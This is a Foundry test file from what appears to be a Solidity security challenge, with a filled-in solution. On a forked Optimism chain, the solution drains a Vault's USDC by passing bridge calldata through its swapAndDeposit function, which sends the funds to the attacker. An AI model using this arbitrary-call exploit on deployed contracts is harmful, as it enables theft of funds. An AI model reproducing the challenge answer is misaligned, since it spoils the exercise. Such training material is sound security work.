// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/10-OptimisticSwapper.sol";
import {ERC20} from "../lib/openzeppelin/token/ERC20/ERC20.sol";

contract OptimisticSwapperTest is Test {
    ERC20 token;
    Vault public vault;

    function setUp() public {
        vm.createSelectFork("https://mainnet.optimism.io", 124342834);

        token = ERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607); // Optimism USDC
        vault = new Vault(address(token));

        address user = makeAddr("USER");
        deal(address(token), user, 100);

        vm.startPrank(user);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(100);
        vm.stopPrank();
    }

    function test_OptimisticSwapper() public {
        address attacker = makeAddr("ATTACKER");

        vm.startPrank(attacker);

        // START OF SOLUTION
        // (You can create any additional contract if needed)

        bytes memory data = abi.encodeCall(IBridge.bridgeERC20To, (
            address(token),
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // L1 token
            attacker,   // to
            100,        // amount
            200000,     // min gas limit
            ""
        ));
        address bridge = 0x4200000000000000000000000000000000000010;
        vault.swapAndDeposit(address(token), 0, 0, bridge, data);

        // END OF SOLUTION

        uint256 vaultBalance = token.balanceOf(address(vault));
        assertEq(vaultBalance, 0, "Vault still has balance");
    }
}

interface IBridge {
    function bridgeERC20To(
        address _localToken,
        address _remoteToken,
        address _to,
        uint256 _amount,
        uint32 _minGasLimit,
        bytes calldata _extraData
    ) external;
}